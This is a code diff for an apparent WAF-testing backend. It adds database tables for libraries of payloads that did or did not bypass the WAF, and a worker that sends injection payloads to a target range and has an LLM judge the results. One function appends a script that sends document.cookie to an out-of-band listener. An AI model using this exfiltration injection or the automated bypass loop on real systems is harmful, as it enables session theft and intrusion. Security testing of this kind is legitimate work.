+            CREATE TABLE IF NOT EXISTS reports (
+                id TEXT PRIMARY KEY,
+                success_sample_id TEXT NOT NULL UNIQUE,
+                source_agent TEXT NOT NULL,
+                source_candidate_id TEXT NOT NULL,
+                source_archived_payload_id TEXT,
+                sample_name TEXT NOT NULL,
+                vulnerability TEXT NOT NULL,
+                category TEXT NOT NULL,
+                delivery TEXT NOT NULL,
+                target TEXT NOT NULL,
+                payload_content TEXT NOT NULL,
+                sample_test_note TEXT,
+                provenance_json TEXT NOT NULL,
+                sample_created_at TEXT NOT NULL,
+                title TEXT NOT NULL,
+                verification_environment TEXT NOT NULL DEFAULT '',
+                prerequisites TEXT NOT NULL DEFAULT '',
+                verification_steps TEXT NOT NULL DEFAULT '',
+                actual_result TEXT NOT NULL DEFAULT '',
+                conclusion TEXT NOT NULL DEFAULT '',
+                tester TEXT NOT NULL DEFAULT '',
+                verification_date TEXT NOT NULL DEFAULT '',
+                notes TEXT NOT NULL DEFAULT '',
+                created_at TEXT NOT NULL,
+                updated_at TEXT NOT NULL
+            );
+            CREATE TABLE IF NOT EXISTS report_images (
+                id TEXT PRIMARY KEY,
+                report_id TEXT NOT NULL,
+                original_name TEXT NOT NULL,
+                relative_path TEXT NOT NULL UNIQUE,
+                media_type TEXT NOT NULL,
+                size_bytes INTEGER NOT NULL,
+                caption TEXT NOT NULL DEFAULT '',
+                sort_order INTEGER NOT NULL DEFAULT 0,
+                created_at TEXT NOT NULL,
+                updated_at TEXT NOT NULL
+            );
+            CREATE TABLE IF NOT EXISTS waf_test_runs (
+                id TEXT PRIMARY KEY,
+                agent TEXT NOT NULL CHECK(agent IN ('semantic', 'encoding', 'cross')),
+                candidate_id TEXT NOT NULL,
+                base_name TEXT NOT NULL,
+                vulnerability TEXT NOT NULL,
+                payload_snapshot TEXT NOT NULL,
+                status TEXT NOT NULL CHECK(status IN ('queued', 'running', 'completed', 'failed')),
+                result TEXT,
+                evidence TEXT,
+                request_summary TEXT,
+                response_excerpt TEXT,
+                http_status INTEGER,
+                error_message TEXT,
+                created_at TEXT NOT NULL,
+                started_at TEXT,
+                completed_at TEXT
+            );
+            CREATE TABLE IF NOT EXISTS verification_jobs (
+                id TEXT PRIMARY KEY,
+                source_agent TEXT NOT NULL,
+                source_candidate_id TEXT NOT NULL,
+                candidate_kind TEXT NOT NULL,
+                base_name TEXT NOT NULL,
+                vulnerability TEXT NOT NULL,
+                payload_snapshot TEXT NOT NULL,
+                delivery TEXT NOT NULL,
+                status TEXT NOT NULL CHECK(status IN ('queued', 'running', 'completed', 'failed')),
+                target_key TEXT NOT NULL,
+                raw_evidence_json TEXT,
+                verdict_json TEXT,
+                bypass_verdict TEXT,
+                execution_verdict TEXT,
+                failure_stage TEXT,
+                library_record_id TEXT,
+                error_message TEXT,
+                attempt_count INTEGER NOT NULL DEFAULT 0,
+                created_at TEXT NOT NULL,
+                started_at TEXT,
+                completed_at TEXT,
+                UNIQUE(source_agent, source_candidate_id)
+            );
+            CREATE INDEX IF NOT EXISTS idx_verification_jobs_status
+                ON verification_jobs(status, created_at);
+            CREATE TABLE IF NOT EXISTS bypass_library (
+                id TEXT PRIMARY KEY,
+                source_agent TEXT NOT NULL,
+                source_candidate_id TEXT NOT NULL,
+                candidate_kind TEXT NOT NULL,
+                name TEXT NOT NULL,
+                vulnerability TEXT NOT NULL,
+                delivery TEXT NOT NULL,
+                target_key TEXT NOT NULL,
+                content TEXT NOT NULL,
+                confidence REAL NOT NULL,
+                rationale TEXT NOT NULL,
+                provenance_json TEXT NOT NULL,
+                bypass_success INTEGER NOT NULL DEFAULT 0,
+                verification_success INTEGER NOT NULL DEFAULT 0,
+                labels_json TEXT NOT NULL DEFAULT '[]',
+                verification_job_id TEXT,
+                target_profile_id TEXT,
+                created_at TEXT NOT NULL,
+                updated_at TEXT NOT NULL,
+                UNIQUE(source_agent, source_candidate_id)
+            );
+            CREATE INDEX IF NOT EXISTS idx_bypass_library_vuln
+                ON bypass_library(vulnerability, created_at DESC);
+            CREATE TABLE IF NOT EXISTS block_library (
+                id TEXT PRIMARY KEY,
+                source_agent TEXT NOT NULL,
+                source_candidate_id TEXT NOT NULL,
+                candidate_kind TEXT NOT NULL,
+                name TEXT NOT NULL,
+                vulnerability TEXT NOT NULL,
+                delivery TEXT NOT NULL,
+                target_key TEXT NOT NULL,
+                content TEXT NOT NULL,
+                failure_stage TEXT NOT NULL,
+                confidence REAL NOT NULL,
+                rationale TEXT NOT NULL,
+                provenance_json TEXT NOT NULL,
+                bypass_success INTEGER NOT NULL DEFAULT 0,
+                verification_success INTEGER NOT NULL DEFAULT 0,
+                labels_json TEXT NOT NULL DEFAULT '[]',
+                verification_job_id TEXT,
+                target_profile_id TEXT,
+                created_at TEXT NOT NULL,
+                updated_at TEXT NOT NULL,
+                UNIQUE(source_agent, source_candidate_id)
+            );
+            CREATE INDEX IF NOT EXISTS idx_block_library_stage
+                ON block_library(failure_stage, created_at DESC);
+            CREATE TABLE IF NOT EXISTS unverified_library (
+                id TEXT PRIMARY KEY,
+                source_agent TEXT NOT NULL,
+                source_candidate_id TEXT NOT NULL,
+                candidate_kind TEXT NOT NULL,
+                name TEXT NOT NULL,
+                vulnerability TEXT NOT NULL,
+                delivery TEXT NOT NULL,
+                target_key TEXT NOT NULL,
+                content TEXT NOT NULL,
+                confidence REAL NOT NULL,
+                rationale TEXT NOT NULL,
+                provenance_json TEXT NOT NULL,
+                verification_job_id TEXT,
+                target_profile_id TEXT,
+                created_at TEXT NOT NULL,
+                updated_at TEXT NOT NULL,
+                UNIQUE(source_agent, source_candidate_id)
+            );
+            CREATE INDEX IF NOT EXISTS idx_unverified_library_vuln
+                ON unverified_library(vulnerability, created_at DESC);
+            CREATE TABLE IF NOT EXISTS kb_observations (
+                id TEXT PRIMARY KEY,
+                source_payload_id TEXT NOT NULL,
+                source_agent TEXT NOT NULL,
+                source_candidate_id TEXT NOT NULL,
+                candidate_kind TEXT NOT NULL,
+                vulnerability TEXT NOT NULL,
+                target_key TEXT NOT NULL,
+                bypass_success INTEGER NOT NULL,
+                verification_success INTEGER NOT NULL,
+                labels_json TEXT NOT NULL,
+                failure_stage TEXT,
+                raw_evidence_json TEXT,
+                verdict_json TEXT,
+                target_profile_json TEXT,
+                waf_policy_version TEXT,
+                backend_version TEXT,
+                created_at TEXT NOT NULL
+            );
+            CREATE INDEX IF NOT EXISTS idx_kb_observations_payload
+                ON kb_observations(source_payload_id, created_at DESC);
+            CREATE TABLE IF NOT EXISTS kb_prune_events (
+                id TEXT PRIMARY KEY,
+                technique_id TEXT,
+                primitive TEXT,
+                reason TEXT,
+                metadata_json TEXT,
+                version TEXT,
+                created_at TEXT NOT NULL
+            );
+            CREATE TABLE IF NOT EXISTS kb_techniques (
+                id TEXT PRIMARY KEY,
+                technique_id TEXT NOT NULL UNIQUE,
+                name TEXT,
+                vulnerability TEXT,
+                status TEXT NOT NULL DEFAULT 'pending',
+                success_count INTEGER NOT NULL DEFAULT 0,
+                labels_json TEXT,
+                source_note TEXT,
+                created_at TEXT NOT NULL,
+                updated_at TEXT NOT NULL
+            );
+            """
+        )
 
+        # Migrate legacy tables that predate some columns (idempotent).
+        _ensure_columns(
+            connection,
+            "payloads",
+            [
+                ("archived_from_candidate_id", "TEXT"),
+                ("source_agent", "TEXT"),
+                ("source_candidate_id", "TEXT"),
+                ("iteration_metadata_json", "TEXT"),
+                ("is_pool_snapshot", "INTEGER NOT NULL DEFAULT 0"),
+                ("severity", "TEXT NOT NULL DEFAULT '中危'"),
+                ("is_executable", "INTEGER NOT NULL DEFAULT 1"),
+                ("usage_method", "TEXT NOT NULL DEFAULT ''"),
+                ("success_indicators", "TEXT NOT NULL DEFAULT ''"),
+                ("is_deleted", "INTEGER NOT NULL DEFAULT 0"),
+                ("labels_json", "TEXT NOT NULL DEFAULT '[\"未绕过\",\"未验证\"]'"),
+            ],
+        )
+        connection.execute("UPDATE payloads SET severity = '中危' WHERE severity IS NULL OR TRIM(severity) = ''")
+        connection.execute("UPDATE payloads SET is_executable = 1 WHERE is_executable IS NULL")
+        connection.execute("UPDATE payloads SET labels_json = '[\"未绕过\",\"未验证\"]' WHERE labels_json IS NULL OR TRIM(labels_json) = ''")
+        if connection.execute("SELECT 1 FROM sqlite_master WHERE type='table' AND name='payload_library_archive'").fetchone():
+            _ensure_columns(
+                connection,
+                "payload_library_archive",
+                [
+                    ("severity", "TEXT NOT NULL DEFAULT '中危'"),
+                    ("is_executable", "INTEGER NOT NULL DEFAULT 1"),
+                ],
+            )
+            connection.execute("UPDATE payload_library_archive SET severity = '中危' WHERE severity IS NULL OR TRIM(severity) = ''")
+            connection.execute("UPDATE payload_library_archive SET is_executable = 1 WHERE is_executable IS NULL")
+        _ensure_columns(
+            connection,
+            "generation_tasks",
+            [
+                ("candidate_count", "INTEGER NOT NULL DEFAULT 5"),
+                ("direction_context_json", "TEXT NOT NULL DEFAULT '{}'"),
+                ("base_parts_json", "TEXT NOT NULL DEFAULT '[]'"),
+                ("parser_confidence", "REAL NOT NULL DEFAULT 0"),
+                ("parser_status", "TEXT NOT NULL DEFAULT 'unsupported'"),
+                ("unsupported_reason", "TEXT"),
+            ],
+        )
+        _ensure_columns(
+            connection,
+            "candidates",
+            [
+                ("used_direction_ids_json", "TEXT NOT NULL DEFAULT '[]'"),
+                ("next_directions_json", "TEXT NOT NULL DEFAULT '[]'"),
+                ("execution_goal_id", "TEXT"),
+                ("semantic_dimension_ids_json", "TEXT NOT NULL DEFAULT '[]'"),
+                ("semantic_delta_json", "TEXT NOT NULL DEFAULT '{}'"),
+                ("verification_spec_json", "TEXT"),
+                ("base_parts_json", "TEXT NOT NULL DEFAULT '[]'"),
+                ("candidate_parts_json", "TEXT NOT NULL DEFAULT '[]'"),
+                ("part_operations_json", "TEXT NOT NULL DEFAULT '[]'"),
+                ("parser_confidence", "TEXT NOT NULL DEFAULT '0'"),
+                ("parser_status", "TEXT NOT NULL DEFAULT 'unsupported'"),
+                ("unsupported_reason", "TEXT"),
+            ],
+        )
+        _ensure_columns(
+            connection,
+            "encoding_tasks",
+            [("direction_context_json", "TEXT NOT NULL DEFAULT '{}'")],
+        )
+        _ensure_columns(
+            connection,
+            "encoding_candidates",
+            [
+                ("origin", "TEXT NOT NULL DEFAULT 'generated'"),
+                ("migration_note", "TEXT"),
+                ("migrated_from_candidate_id", "TEXT"),
+                ("used_direction_ids_json", "TEXT NOT NULL DEFAULT '[]'"),
+                ("next_directions_json", "TEXT NOT NULL DEFAULT '[]'"),
+            ],
+        )
+        # 双成功标签 + 观测字段（老库增量迁移）
+        _ensure_columns(
+            connection,
+            "bypass_library",
+            [
+                ("bypass_success", "INTEGER NOT NULL DEFAULT 0"),
+                ("verification_success", "INTEGER NOT NULL DEFAULT 0"),
+                ("labels_json", "TEXT NOT NULL DEFAULT '[]'"),
+                ("verification_job_id", "TEXT"),
+                ("target_profile_id", "TEXT"),
+            ],
+        )
+        _ensure_columns(
+            connection,
+            "block_library",
+            [
+                ("bypass_success", "INTEGER NOT NULL DEFAULT 0"),
+                ("verification_success", "INTEGER NOT NULL DEFAULT 0"),
+                ("labels_json", "TEXT NOT NULL DEFAULT '[]'"),
+                ("verification_job_id", "TEXT"),
+                ("target_profile_id", "TEXT"),
+            ],
+        )
+        _ensure_columns(
+            connection,
+            "unverified_library",
+            [
+                ("verification_job_id", "TEXT"),
+                ("target_profile_id", "TEXT"),
+            ],
+        )
+
+        connection.execute(
+            "CREATE INDEX IF NOT EXISTS idx_waf_test_runs_candidate_latest "
+            "ON waf_test_runs(agent, candidate_id, created_at DESC)"
+        )
+        connection.execute(
+            "CREATE INDEX IF NOT EXISTS idx_success_samples_active_created "
+            "ON success_samples(status, created_at DESC)"
+        )
+        connection.commit()
+        connection.close()
+
+
+@asynccontextmanager
+async def lifespan(app: FastAPI):
+    """Initialize database and resources on startup."""
+    load_dotenv(CONFIG_PATH)
+    initialize_database()
     yield
 
 
@@ -888,12 +1863,17 @@ def payload_page_items(records: list[sqlite3.Row]) -> list[dict[str, Any]]:
     return result
 
 
-def paged_payload_response(sql: str, limit: int | None, cursor: int) -> list[dict[str, Any]] | dict[str, Any]:
+def paged_payload_response(
+    sql: str,
+    limit: int | None,
+    cursor: int,
+    params: tuple[Any, ...] = (),
+) -> list[dict[str, Any]] | dict[str, Any]:
     if limit is None:
-        return payload_page_items(db_rows(sql))
+        return payload_page_items(db_rows(sql, params))
     page_size = min(limit, MAX_PAGE_SIZE)
-    total = db_row(f"SELECT COUNT(*) AS count FROM ({sql})")["count"]
-    records = db_rows(f"{sql} LIMIT ? OFFSET ?", (page_size, cursor))
+    total = db_row(f"SELECT COUNT(*) AS count FROM ({sql})", params)["count"]
+    records = db_rows(f"{sql} LIMIT ? OFFSET ?", (*params, page_size, cursor))
     items = payload_page_items(records)
     next_cursor = cursor + len(items)
     return {"items": items, "total": total, "next_cursor": next_cursor if next_cursor < total else None}
@@ -907,6 +1887,14 @@ def payload_view(source: sqlite3.Row | dict[str, Any]) -> dict[str, Any]:
     source_candidate_id = item.pop("source_candidate_id", None)
     item.pop("is_pool_snapshot", None)
     item.pop("is_deleted", None)
+    # These legacy authoring fields remain in storage for compatibility with
+    # candidate/report history, but are no longer part of the source Payload
+    # API contract.
+    for field in ("name", "category", "target", "difficulty", "usage_method", "success_indicators"):
+        item.pop(field, None)
+    item["severity"] = item.get("severity") or "中危"
+    item["is_executable"] = bool(item.get("is_executable", 1))
+    item["labels"] = json_value(item.pop("labels_json", None), ["未绕过", "未验证"])
     item["used_direction_ids"] = metadata.get("used_direction_ids", [])
     item["next_directions"] = metadata.get("next_directions", [])
     archive_outcome = metadata.get("archive_outcome")
@@ -1079,91 +2067,6 @@ def success_sample_view(source: sqlite3.Row | dict[str, Any]) -> dict[str, Any]:
     return item
 
 
-def sync_candidate_success_sample(
-    connection: sqlite3.Connection,
-    agent: Literal["semantic", "encoding"],
-    candidate: dict[str, Any],
-    base: dict[str, Any],
-    status: str,
-    test_note: str | None,
-) -> None:
-    timestamp = utc_now()
-    if status != "test_success":
-        connection.execute(
-            """
-            UPDATE success_samples SET status = 'deleted', updated_at = ?
-            WHERE agent = ? AND candidate_id = ?
-            """,
-            (timestamp, agent, candidate["id"]),
-        )
-        return
-
-    archived = connection.execute(
-        """
-        SELECT id FROM payloads
-        WHERE source_agent = ? AND source_candidate_id = ? AND is_deleted = 0
-        ORDER BY created_at DESC LIMIT 1
-        """,
-        (agent, candidate["id"]),
-    ).fetchone()
-    archived_payload_id = archived["id"] if archived else None
-    if agent == "semantic":
-        provenance = {
-            "base_payload_id": candidate["base_payload_id"],
-            "rule_labels": json_value(candidate.get("rule_labels_json"), []),
-            "execution_goal_id": candidate.get("execution_goal_id"),
-        }
-        prefix = "语义迭代"
-    else:
-        provenance = {
-            "base_payload_id": candidate["base_payload_id"],
-            "encoding_chain": json_value(candidate.get("encoding_chain_json"), []),
-            "decode_path": json_value(candidate.get("decode_path_json"), []),
-            "origin": candidate.get("origin") or "generated",
-        }
-        prefix = "编码迭代"
-
-    connection.execute(
-        """
-        INSERT INTO success_samples (
-            id, agent, candidate_id, archived_payload_id, name, vulnerability,
-            category, delivery, target, difficulty, content, test_note,
-            provenance_json, status, created_at, updated_at
-        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'active', ?, ?)
-        ON CONFLICT(agent, candidate_id) DO UPDATE SET
-            archived_payload_id = excluded.archived_payload_id,
-            name = excluded.name,
-            vulnerability = excluded.vulnerability,
-            category = excluded.category,
-            delivery = excluded.delivery,
-            target = excluded.target,
-            difficulty = excluded.difficulty,
-            content = excluded.content,
-            test_note = excluded.test_note,
-            provenance_json = excluded.provenance_json,
-            status = 'active',
-            updated_at = excluded.updated_at
-        """,
-        (
-            str(uuid.uuid4()),
-            agent,
-            candidate["id"],
-            archived_payload_id,
-            f"{prefix} · {base['name']}",
-            base["vulnerability"],
-            base["category"],
-            candidate["delivery"],
-            base["target"],
-            base["difficulty"],
-            candidate["content"],
-            test_note,
-            json.dumps(provenance, ensure_ascii=False),
-            timestamp,
-            timestamp,
-        ),
-    )
-
-
 def update_candidate_record(
     agent: Literal["semantic", "encoding"],
     candidate_id: str,
@@ -1202,14 +2105,6 @@ def update_candidate_record(
             connection.execute(
                 f"UPDATE {table} SET status = ?, test_note = ?, updated_at = ? WHERE id = ?",
                 (body.status, body.test_note, utc_now(), candidate_id),
-            )
-            sync_candidate_success_sample(
-                connection,
-                agent,
-                candidate,
-                dict(base_record),
-                body.status,
-                body.test_note,
             )
             connection.commit()
         except HTTPException:
@@ -1263,13 +2158,22 @@ def delete_candidate_record(
                     detail="Archived candidates cannot be deleted from the queue",
                 )
 
+            # 级联清理检验任务与库记录
             connection.execute(
-                """
-                UPDATE success_samples
-                SET status = 'invalidated', updated_at = ?
-                WHERE agent = ? AND candidate_id = ? AND status != 'deleted'
-                """,
-                (utc_now(), agent, candidate_id),
+                "DELETE FROM verification_jobs WHERE source_agent = ? AND source_candidate_id = ?",
+                (agent, candidate_id),
+            )
+            connection.execute(
+                "DELETE FROM bypass_library WHERE source_agent = ? AND source_candidate_id = ?",
+                (agent, candidate_id),
+            )
+            connection.execute(
+                "DELETE FROM block_library WHERE source_agent = ? AND source_candidate_id = ?",
+                (agent, candidate_id),
+            )
+            connection.execute(
+                "DELETE FROM unverified_library WHERE source_agent = ? AND source_candidate_id = ?",
+                (agent, candidate_id),
             )
             connection.execute(f"DELETE FROM {table} WHERE id = ?", (candidate_id,))
             connection.commit()
@@ -1365,32 +2269,32 @@ def archive_candidate_record(
 
             payload_id = str(uuid.uuid4())
             timestamp = utc_now()
+            archived_values = {
+                "id": payload_id,
+                "name": f"{prefix} · {payload_internal_name(candidate['content'])}",
+                "vulnerability": base["vulnerability"],
+                "category": base["category"],
+                "delivery": candidate["delivery"],
+                "target": base["target"],
+                "difficulty": base["difficulty"],
+                "content": candidate["content"],
+                "created_at": timestamp,
+                "archived_from_candidate_id": candidate_id,
+                "source_agent": agent,
+                "source_candidate_id": candidate_id,
+                "iteration_metadata_json": json.dumps(metadata, ensure_ascii=False),
+                "is_pool_snapshot": 0,
+                "severity": base.get("severity") or "中危",
+                "is_executable": 1,
+                "usage_method": guidance.get("usage_method") or "",
+                "success_indicators": guidance.get("success_indicators") or "",
+                "is_deleted": 0,
+            }
+            table_columns = {column[1] for column in connection.execute("PRAGMA table_info(payloads)")}
+            insert_columns = [column for column in archived_values if column in table_columns]
             connection.execute(
-                """
-                INSERT INTO payloads (
-                    id, name, vulnerability, category, delivery, target, difficulty,
-                    content, created_at, archived_from_candidate_id, source_agent,
-                    source_candidate_id, iteration_metadata_json, is_pool_snapshot,
-                    usage_method, success_indicators, is_deleted
-                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 0, ?, ?, 0)
-                """,
-                (
-                    payload_id,
-                    f"{prefix} · {base['name']}",
-                    base["vulnerability"],
-                    base["category"],
-                    candidate["delivery"],
-                    base["target"],
-                    base["difficulty"],
-                    candidate["content"],
-                    timestamp,
-                    candidate_id,
-                    agent,
-                    candidate_id,
-                    json.dumps(metadata, ensure_ascii=False),
-                    guidance.get("usage_method") or "",
-                    guidance.get("success_indicators") or "",
-                ),
+                f"INSERT INTO payloads ({', '.join(insert_columns)}) VALUES ({', '.join('?' for _ in insert_columns)})",
+                tuple(archived_values[column] for column in insert_columns),
             )
             connection.execute(
                 f"UPDATE {table} SET status = 'archived', updated_at = ? WHERE id = ?",
@@ -1424,9 +2328,6 @@ def archive_candidate_record(
                         timestamp,
                     ),
                 )
-            sync_candidate_success_sample(
-                connection, agent, candidate, base, candidate_status, candidate.get("test_note")
-            )
             connection.commit()
         except HTTPException:
             connection.rollback()
@@ -1653,6 +2554,785 @@ def run_waf_test(run_id: str) -> None:
                 connection.close()
 
 
+# =============================================================================
+# 独立 LLM 检验 Agent：自动入队 + 后台受控并发 worker + bypass/block 库落库
+# =============================================================================
+
+VERIFIABLE_VULNERABILITIES = {"command-injection", "sql-injection", "xss", "log4j", "file-upload"}
+
+
+def enqueue_verification(
+    connection: sqlite3.Connection,
+    agent: str,
+    candidate_id: str,
+    candidate_kind: str,
+    base: dict[str, Any],
+    content: str,
+    delivery: str,
+) -> str | None:
+    """把一条 candidate 写入 verification_jobs（幂等 upsert）。
+
+    不在此 commit——由调用方的 ``with DB_LOCK:`` 事务统一提交。
+    返回 job id；未启用自动检验或不可验证的漏洞类型时返回 None。
+    """
+    if not _env_bool("AUTO_VERIFY", True):
+        return None
+    vulnerability = base.get("vulnerability", "")
+    if vulnerability not in VERIFIABLE_VULNERABILITIES:
+        return None
+    timestamp = utc_now()
+    job_id = str(uuid.uuid4())
+    connection.execute(
+        """
+        INSERT INTO verification_jobs (
+            id, source_agent, source_candidate_id, candidate_kind, base_name,
+            vulnerability, payload_snapshot, delivery, status, target_key,
+            raw_evidence_json, verdict_json, bypass_verdict, execution_verdict,
+            failure_stage, library_record_id, error_message, attempt_count,
+            created_at, started_at, completed_at
+        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'queued', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, ?, NULL, NULL)
+        ON CONFLICT(source_agent, source_candidate_id) DO UPDATE SET
+            payload_snapshot = excluded.payload_snapshot,
+            delivery = excluded.delivery,
+            status = 'queued',
+            error_message = NULL,
+            created_at = excluded.created_at
+        """,
+        (
+            job_id,
+            agent,
+            candidate_id,
+            candidate_kind,
+            base.get("name", ""),
+            vulnerability,
+            content,
+            delivery,
+            timestamp,
+        ),
+    )
+    return job_id
+
+
+def _start_verification_loop() -> None:
+    """确保只有一个后台检验 worker loop 运行。"""
+    global VERIFICATION_LOOP_STARTED
+    with VERIFICATION_LOOP_FLAG_LOCK:
+        if VERIFICATION_LOOP_STARTED:
+            return
+        VERIFICATION_LOOP_STARTED = True
+    start_background_thread(_verification_worker_loop)
+
+
+def _verification_worker_loop() -> None:
+    """串行认领 queued 任务，受控并发执行网络/LLM 判定。"""
+    while True:
+        with DB_LOCK:
+            connection = sqlite3.connect(DB_PATH)
+            connection.row_factory = sqlite3.Row
+            try:
+                job_record = connection.execute(
+                    """
+                    SELECT * FROM verification_jobs
+                    WHERE status = 'queued'
+                    ORDER BY created_at ASC LIMIT 1
+                    """
+                ).fetchone()
+                if not job_record:
+                    connection.close()
+                    break
+                job = dict(job_record)
+                connection.execute(
+                    """
+                    UPDATE verification_jobs
+                    SET status = 'running', started_at = ?, attempt_count = attempt_count + 1
+                    WHERE id = ?
+                    """,
+                    (utc_now(), job["id"]),
+                )
+                connection.commit()
+            finally:
+                connection.close()
+
+        with VERIFICATION_SEMAPHORE:
+            _process_verification_job(job)
+
+
+def _oob_listener_url() -> str:
+    """返回 OOB 监听服务基地址（未配置则为空串）。"""
+    return os.getenv("OOB_LISTENER_URL", "").strip().rstrip("/")
+
+
+def _inject_oob_payload(content: str, token: str) -> str:
+    """检验侧智能注入 OOB 外带地址。
+
+    1. 若 payload 里有外部 URL（http/https），替换第一个为 OOB 回调地址。
+    2. 否则在 payload 末尾追加一段 fetch 外发代码（把 document.cookie 发到 OOB）。
+    3. 保留原 payload 结构，避免破坏绕过语义。
+    """
+    oob = _oob_listener_url()
+    if not oob:
+        return content
+    callback = f"{oob}/?id={token}&c="
+    # 1. 替换已有的外部 http(s) URL
+    url_re = re.compile(r"https?://[a-zA-Z0-9_.\-:]+(?:/[^\s\"'<>]*)?")
+    if url_re.search(content):
+        return url_re.sub(lambda m: callback + quote(m.group(0), safe=""), content, count=1)
+    # 2. 追加 fetch 外发代码
+    exfil = (
+        f"{content}"
+        f"<script>fetch('{callback}'+encodeURIComponent(document.cookie))</script>"
+    )
+    return exfil
+
+
+def _check_oob_callback(token: str, wait_seconds: float) -> bool:
+    """轮询 OOB 服务，返回该 token 是否收到回连。"""
+    oob = _oob_listener_url()
+    if not oob:
+        return False
+    check_url = f"{oob}/api/oob/check?token={token}"
+    deadline = time.monotonic() + wait_seconds
+    while time.monotonic() < deadline:
+        try:
+            response = httpx.get(check_url, timeout=3)
+            if response.status_code == 200:
+                payload = response.json()
+                if payload.get("found"):
+                    return True
+        except Exception:  # noqa: BLE001
+            pass
+        time.sleep(1.0)
+    return False
+
+
+def _process_verification_job(job: dict[str, Any]) -> None:
+    """对单个 job 执行：解析 candidate → 靶场发请求 → LLM 判定 → 落库。"""
+    agent = job["source_agent"]
+    candidate_id = job["source_candidate_id"]
+    candidate_kind = job["candidate_kind"]
+    vulnerability = job["vulnerability"]
+    content = job["payload_snapshot"]
+
+    try:
+        candidate, base = _resolve_candidate_for_verification(
+            agent, candidate_id, candidate_kind, content, vulnerability
+        )
+    except HTTPException as error:
+        _fail_verification_job(job, f"解析候选失败：{error.detail}")
+        return
+
+    try:
+        target_key, adapter = resolve_adapter(vulnerability)
+    except ValueError as error:
+        _fail_verification_job(job, str(error))
+        return
+
+    # 判断是否无法自动闭环（外带/盲注等），决定 execution 是否可标 unverified。
+    exec_unverifiable = is_unverifiable_payload(content, vulnerability)
+
+    # XSS 外带若配置了 OOB 监听，尝试自动闭环（注入回调地址 + 轮询回连）。
+    oob_token: str | None = None
+    payload_to_send = content
+    if vulnerability == "xss" and exec_unverifiable and _oob_listener_url():
+        oob_token = uuid.uuid4().hex
+        payload_to_send = _inject_oob_payload(content, oob_token)
+
+    # 1. 靶场发真实请求（网络/浏览器，期间不持 DB_LOCK）。
+    lesson_hint = json_value(job.get("verdict_json"), {}).get("lesson_hint") if job.get("verdict_json") else None
+    try:
+        kwargs = {"lesson_hint": lesson_hint} if lesson_hint else {}
+        evidence: TargetEvidence = adapter(str(CONFIG_PATH), payload_to_send, base, **kwargs)
+    except Exception as error:  # noqa: BLE001
+        _fail_verification_job(job, f"靶场请求异常：{error}")
+        return
+
+    # 2. 若启用了 OOB，轮询是否收到回连。
+    oob_confirmed = False
+    if oob_token and evidence.outcome not in {"waf_blocked", "request_error"}:
+        wait = _env_positive_int("OOB_WAIT_SECONDS", 8)
+        oob_confirmed = _check_oob_callback(oob_token, float(wait))
+
+    # 3. 确定性提示 + LLM 判定。
+    deterministic_hints = {
+        "adapter_outcome": evidence.outcome,
+        "adapter_evidence": evidence.evidence,
+    }
+    if oob_confirmed:
+        # 收到 OOB 回连 = 确定性执行成功。
+        evidence = TargetEvidence(
+            target_key=evidence.target_key,
+            vulnerability=evidence.vulnerability,
+            request_summary=evidence.request_summary,
+            http_status=evidence.http_status,
+            response_excerpt=evidence.response_excerpt,
+            response_headers=evidence.response_headers,
+            outcome="execution_confirmed",
+            evidence=f"OOB 回连确认（token={oob_token}）",
+            baseline_excerpt=evidence.baseline_excerpt,
+        )
+        verdict = normalize_verdict(
+            {"bypass_verdict": "bypass", "execution_verdict": "confirmed"},
+            "execution_confirmed",
+        )
+    else:
+        verdict = _call_verification_judge(
+            evidence, content, vulnerability, deterministic_hints,
+            agent, candidate_id, exec_unverifiable,
+        )
+
+    # 4. 落库 + 同步 bypass/block/unverified 库。
+    with DB_LOCK:
+        connection = sqlite3.connect(DB_PATH)
+        connection.row_factory = sqlite3.Row
+        try:
+            _persist_verification_result(connection, job, evidence, verdict, base)
+            connection.commit()
+        except Exception as error:  # noqa: BLE001
+            connection.rollback()
+            LOGGER.exception("verification persist failed job=%s", job["id"])
+            _fail_verification_job(job, f"落库异常：{error}")
+        finally:
+            connection.close()
+
+
+def _resolve_candidate_for_verification(
+    agent: str,
+    candidate_id: str,
+    candidate_kind: str,
+    content: str,
+    vulnerability: str,
+) -> tuple[dict[str, Any], dict[str, Any]]:
+    """解析 candidate 与 base payload（复用 waf_candidate_source）。
+
+    找不到 candidate 时回退构造一个最小 base（保留 payload 内容与漏洞类型），
+    避免因候选被删导致检验中断。
+    """
+    connection = sqlite3.connect(DB_PATH)
+    connection.row_factory = sqlite3.Row
+    try:
+        return waf_candidate_source(connection, agent, candidate_id)  # type: ignore[arg-type]
+    except HTTPException:
+        base = {"name": "", "vulnerability": vulnerability, "content": content}
+        return {"id": candidate_id, "content": content}, base
+    finally:
+        connection.close()
+
+
+def _call_verification_judge(
+    evidence: TargetEvidence,
+    content: str,
+    vulnerability: str,
+    deterministic_hints: dict[str, Any],
+    agent: str,
+    candidate_id: str,
+    exec_unverifiable: bool = False,
+) -> dict[str, Any]:
+    """调用 LLM 判定并归一化。确定性 block/error 结果直接短路，不调用 LLM。"""
+    # 确定性短路：无需 LLM 即可定论。
+    short_circuit = normalize_verdict(None, evidence.outcome, exec_unverifiable)
+    if evidence.outcome in {"waf_blocked", "request_error"}:
+        return short_circuit
+
+    config = _verify_llm_config()
+    if not _llm_config_complete(config):
+        # 无 LLM 配置时，仅凭确定性结果给出保守判定。
+        return normalize_verdict(None, evidence.outcome, exec_unverifiable)
+
+    system_prompt = build_judge_system_prompt()
+    user_message = build_judge_user_message(evidence, content, vulnerability, deterministic_hints)
+    messages = [
+        {"role": "system", "content": system_prompt},
+        {"role": "user", "content": user_message},
+    ]
+    try:
+        response = _post_chat_completion(config, messages)
+        response.raise_for_status()
+    except Exception as error:  # noqa: BLE001
+        LOGGER.warning("verification judge LLM failed job=%s/%s: %s", agent, candidate_id, error)
+        return normalize_verdict(None, evidence.outcome, exec_unverifiable)
+
+    raw_message = response.json().get("choices", [{}])[0].get("message", {}).get("content", "")
+    parsed = parse_verdict(raw_message, _extract_json_payload)
+    return normalize_verdict(parsed, evidence.outcome, exec_unverifiable)
+
+
+def _verify_llm_config() -> dict[str, str]:
+    """检验 Agent 专用 LLM 配置，缺省回退到 SEMANTIC_LLM / LLM。"""
+    verify = _llm_config("VERIFY_LLM", "Verification-Judge")
+    if _llm_config_complete(verify):
+        return verify
